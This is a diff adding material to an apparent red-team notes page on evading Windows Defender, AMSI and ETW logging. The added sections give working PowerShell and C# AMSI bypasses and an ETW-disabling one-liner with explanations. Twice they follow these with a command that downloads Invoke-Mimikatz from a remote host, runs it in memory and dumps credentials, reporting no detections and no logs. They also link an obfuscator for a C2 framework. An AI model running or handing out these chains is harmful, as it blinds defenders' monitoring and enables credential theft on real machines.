@@ -450,6 +450,8 @@ git clone https://github.com/GhostPack/Rubeus.git
 <p>Tadaa!!!! Victory!!! No more detections, we can now drop the clean rubeus file to our &quot;C:\&quot; drive and defender won't detect it. Let's try:</p>
 <p><img src="./images/rubeus_defenderscan.jpg" alt="Screenshot" /></p>
 <h2><a class="header" href="#img-srcimagesrubeus_defender_cleanjpg-altscreenshot-" id="img-srcimagesrubeus_defender_cleanjpg-altscreenshot-"><img src="./images/rubeus_defender_clean.jpg" alt="Screenshot" /></a></h2>
+<p>https://github.com/Matthew-IE/XObfuscator.git
+add to Havoc C2</p>
 <p>strings, threatcheck, gocheck, floss, yara</p>
 <p>C:\Temp&gt;gocheck64.exe C:\Git\Rubeus\Rubeus\bin\x64\Release\Rubeus.exe --defender
 c:\Git\ThreatCheck\ThreatCheck\bin\x64\Release&gt;ThreatCheck.exe -f C:\Git\Rubeus\Rubeus\bin\x64\Release\Rubeus.exe</p>
@@ -1131,12 +1133,75 @@ $field.SetValue($null,$true)
 </code></pre>
 <p>https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b</p>
 <p>And finally AMSI.FAIL</p>
-<hr />
-<h1><a class="header" href="#dotnet-packing" id="dotnet-packing">dotnet packing</a></h1>
-<p>ConfuserEx
-Babel</p>
-<hr />
-<p>https://github.com/pracsec/AmsiScanner/tree/main/src</p>
+<p>or this also works</p>
+<pre><code class="language-powershell">class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
+$o = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent
+$t = [TrollAMSI].GetMethods() | Where-Object Name -eq 'M'
+#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($t.MethodHandle)  
+#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($o.MethodHandle)
+[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$t.MethodHandle.Value + [long]8)),0, [long]$o.MethodHandle.Value + [long]8,1)
+</code></pre>
+<p>then run</p>
+<pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;
+</code></pre>
+<p>No detections, AMSI is disabled</p>
+<h2><a class="header" href="#amsi-bypass-in-net-binaries" id="amsi-bypass-in-net-binaries">AMSI Bypass in .NET Binaries</a></h2>
+<p>Yes, the AMSI bypass technique provided, which uses reflection to set the <code>amsiInitFailed</code> field to <code>$true</code>, will also work in .NET binaries, not just in PowerShell.</p>
+<p><strong>Understanding the Technique:</strong></p>
+<ul>
+<li><strong>Reflection:</strong> The core of this bypass relies on .NET reflection, which allows code to inspect and modify types, fields, and methods at runtime.</li>
+<li><strong>Targeting <code>amsiInitFailed</code>:</strong> The code specifically targets the <code>amsiInitFailed</code> static field within the <code>System.Management.Automation.AmsiUtils</code> class. This field is used to indicate whether the AntiMalware Scan Interface (AMSI) initialization has failed.</li>
+<li><strong>Setting to <code>$true</code>:</strong> By setting this field to <code>$true</code>, the code effectively tells the .NET runtime that AMSI initialization has failed, causing AMSI scans to be skipped.</li>
+</ul>
+<p><strong>How it Works in .NET Binaries:</strong></p>
+<ol>
+<li><strong>Locating <code>AmsiUtils</code>:</strong> Just like in PowerShell, you can use reflection in C# (or other .NET languages) to locate the <code>System.Management.Automation.AmsiUtils</code> class.</li>
+<li><strong>Accessing <code>amsiInitFailed</code>:</strong> You can then use reflection to access the <code>amsiInitFailed</code> static field.</li>
+<li><strong>Setting the Value:</strong> Finally, you can use reflection to set the value of the <code>amsiInitFailed</code> field to <code>true</code>.</li>
+</ol>
+<p><strong>C# Example:</strong></p>
+<pre><code class="language-csharp">using System;
+using System.Reflection;
+
+public class AmsiBypass
+{
+    public static void Main(string[] args)
+    {
+        try
+        {
+            // Get the AmsiUtils type
+            Type amsiUtilsType = typeof(System.Management.Automation.AmsiUtils);
+
+            // Get the amsiInitFailed field
+            FieldInfo amsiInitFailedField = amsiUtilsType.GetField(&quot;amsiInitFailed&quot;, BindingFlags.NonPublic | BindingFlags.Static);
+
+            // Set the amsiInitFailed field to true
+            if (amsiInitFailedField != null)
+            {
+                amsiInitFailedField.SetValue(null, true);
+                Console.WriteLine(&quot;AMSI bypassed.&quot;);
+            }
+            else
+            {
+                Console.WriteLine(&quot;amsiInitFailed field not found.&quot;);
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($&quot;Error: {ex.Message}&quot;);
+        }
+    }
+}
+
+-----
+# dotnet packing
+
+ConfuserEx
+Babel
+
+----
+https://github.com/pracsec/AmsiScanner/tree/main/src
+</code></pre>
 <h1><a class="header" href="#hooks-user-land" id="hooks-user-land">Hooks (User land)</a></h1>
 <p><img src="./images/hooking.jpg" alt="Screenshot" /></p>
 <p>HookChecker mr. Un1c0d3r</p>
@@ -1308,6 +1373,150 @@ Microsoft-Windows-Threat-Intelligence</p>
 </tbody></table>
 <p>https://github.com/Lsecqt-Sponsors/Haunt_Agent/blob/main/Payload_Type/haunt/haunt/agent_code/etw.ps1
 https://github.com/MHaggis/PowerShell-Hunter</p>
+<p>https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/</p>
+<p>run after amsi bypass:</p>
+<pre><code class="language-powershell">[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
+</code></pre>
+<p>then run</p>
+<pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;
+</code></pre>
+<p>No detections, AMSI is disabled, ETW is disabled -&gt; Check eventviewer -&gt; no powershell logs.</p>
+<h2><a class="header" href="#understanding-the-components" id="understanding-the-components">Understanding the Components:</a></h2>
+<ul>
+<li><strong><code>[Reflection.Assembly]::LoadWithPartialName('System.Core')</code>:</strong>
+<ul>
+<li>Loads the <code>System.Core.dll</code> assembly, containing core .NET classes, including <code>System.Diagnostics.Eventing.EventProvider</code>.</li>
+</ul>
+</li>
+<li><strong><code>.GetType('System.Diagnostics.Eventing.EventProvider')</code>:</strong>
+<ul>
+<li>Retrieves the <code>System.Diagnostics.Eventing.EventProvider</code> type, responsible for emitting ETW events.</li>
+</ul>
+</li>
+<li><strong><code>.GetField('m_enabled','NonPublic,Instance')</code>:</strong>
+<ul>
+<li>Retrieves the <code>m_enabled</code> field of the <code>EventProvider</code> class, a non-public instance field that determines whether ETW events are enabled.</li>
+</ul>
+</li>
+<li><strong><code>.SetValue(...)</code>:</strong>
+<ul>
+<li>Sets the value of the <code>m_enabled</code> field.</li>
+</ul>
+</li>
+<li><strong><code>[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')</code>:</strong>
+<ul>
+<li>Retrieves the <code>System.Management.Automation.Tracing.PSEtwLogProvider</code> type, a PowerShell-specific wrapper around the .NET ETW functionality.</li>
+</ul>
+</li>
+<li><strong><code>.GetField('etwProvider','NonPublic,Static').GetValue($null)</code>:</strong>
+<ul>
+<li>Retrieves the <code>etwProvider</code> field of the <code>PSEtwLogProvider</code> class, a non-public static field holding a reference to the <code>EventProvider</code> instance used by PowerShell.</li>
+</ul>
+</li>
+<li><strong><code>,0</code>:</strong>
+<ul>
+<li>Sets the <code>m_enabled</code> field to <code>0</code> (false), disabling ETW events for the PowerShell <code>EventProvider</code>.</li>
+</ul>
+</li>
+</ul>
+<h2><a class="header" href="#how-it-works-etw-bypass" id="how-it-works-etw-bypass">How It Works (ETW Bypass):</a></h2>
+<ul>
+<li>PowerShell uses the .NET <code>EventProvider</code> class to generate ETW events.</li>
+<li>The <code>PSEtwLogProvider</code> class in PowerShell acts as a bridge, holding the specific <code>EventProvider</code> instance used for PowerShell logging.</li>
+<li>The <code>m_enabled</code> field within the <code>EventProvider</code> class controls whether events are actually emitted.</li>
+<li>By using reflection, the code directly accesses and modifies this internal <code>m_enabled</code> field, setting it to <code>0</code>.</li>
+<li>This prevents the PowerShell <code>EventProvider</code> from generating ETW events, effectively bypassing ETW logging for that PowerShell process.</li>
+</ul>
+<p><img src="./images/etw_diag.jpg" alt="Screenshot" /></p>
+<h2><a class="header" href="#key-points" id="key-points">Key Points:</a></h2>
+<ul>
+<li>This method relies on internal .NET implementation details and might break if those details change in future .NET or PowerShell versions.</li>
+<li>It only affects the current PowerShell process.</li>
+<li>It is very effective at disabling the ETW logging from within powershell.</li>
+<li>This technique is commonly used by malicious actors.</li>
+<li>EDR solutions monitor for this type of activity.</li>
+</ul>
+<p>CSHARP CODE (AI Generated) using the same ETW bypass (also works for .net binaries)</p>
+<pre><code class="language-CSharp">using System;
+using System.Diagnostics.Eventing;
+using System.Reflection;
+
+public class EtwBypass
+{
+    public static void Main(string[] args)
+    {
+        try
+        {
+            // Get the EventProvider type
+            Type eventProviderType = typeof(EventProvider);
+
+            // Find the m_enabled field (non-public, instance)
+            FieldInfo mEnabledField = eventProviderType.GetField(&quot;m_enabled&quot;, BindingFlags.NonPublic | BindingFlags.Instance);
+
+            // Get the EventProvider instance used by the application (you'll need to adapt this part)
+            // This is the tricky part, as you need to find the specific instance you want to patch.
+            // In a real application, you would need to find the event provider instance that is used.
+            // This example creates a new instance just for demonstration.
+            EventProvider dummyProvider = new EventProvider(Guid.NewGuid());
+
+            // Set the m_enabled field to 0 (false)
+            if (mEnabledField != null)
+            {
+                mEnabledField.SetValue(dummyProvider, 0);
+                Console.WriteLine(&quot;ETW bypassed.&quot;);
+            }
+            else
+            {
+                Console.WriteLine(&quot;m_enabled field not found.&quot;);
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($&quot;Error: {ex.Message}&quot;);
+        }
+    }
+}
+</code></pre>
+<h2><a class="header" href="#etw-patching-in-net-binaries-vs-powershell" id="etw-patching-in-net-binaries-vs-powershell">ETW Patching in .NET Binaries vs. PowerShell</a></h2>
+<p><strong>PowerShell Patch:</strong></p>
+<ul>
+<li>Uses reflection to modify the <code>PSEtwLogProvider</code> within the PowerShell process.</li>
+<li>Specifically targets how PowerShell logs events.</li>
+<li>Limited to the PowerShell process.</li>
+<li>Executed as a PowerShell command.</li>
+<li>Targets the PowerShell ETW logging mechanism.</li>
+</ul>
+<p><strong>.NET Binary Patch (C# Example):</strong></p>
+<ul>
+<li>Compiles into a standalone .NET executable.</li>
+<li>Uses reflection to directly modify the <code>EventProvider</code> class within the running .NET binary.</li>
+<li>Can patch ETW logging for any .NET application that uses the standard .NET <code>EventProvider</code> class, if the correct <code>EventProvider</code> instance can be located.</li>
+<li>Can affect any .NET application.</li>
+<li>Executed as a compiled executable.</li>
+<li>Targets the <code>EventProvider</code> class, allowing it to target any .NET application using that class.</li>
+</ul>
+<p><strong>Key Differences and Implications:</strong></p>
+<ul>
+<li><strong>Scope:</strong>
+<ul>
+<li>PowerShell patch: Limited to the PowerShell process.</li>
+<li>.NET binary patch: Can affect any .NET application, if the correct event provider can be located.</li>
+</ul>
+</li>
+<li><strong>Execution Context:</strong>
+<ul>
+<li>PowerShell patch: Executed as a PowerShell command.</li>
+<li>.NET binary patch: Executed as a compiled executable.</li>
+</ul>
+</li>
+<li><strong>Targeting:</strong>
+<ul>
+<li>Powershell patch: Targets the powershell ETW logging.</li>
+<li>.net binary patch: Targets the event provider class, so it can target any .net application that uses that class.</li>
+</ul>
+</li>
+</ul>
+<p><strong>In summary:</strong> The C# code provides a more general-purpose ETW patching mechanism that can be used independently of PowerShell, while the PowerShell one-liner is specific to the PowerShell environment.</p>
 <h1><a class="header" href="#syscalls-kernel-mode" id="syscalls-kernel-mode">SYSCALLS (Kernel mode)</a></h1>
 <p>https://github.com/joshfinley/SyscallDumper</p>
 <p>https://passthehashbrowns.github.io/hiding-your-syscalls</p>
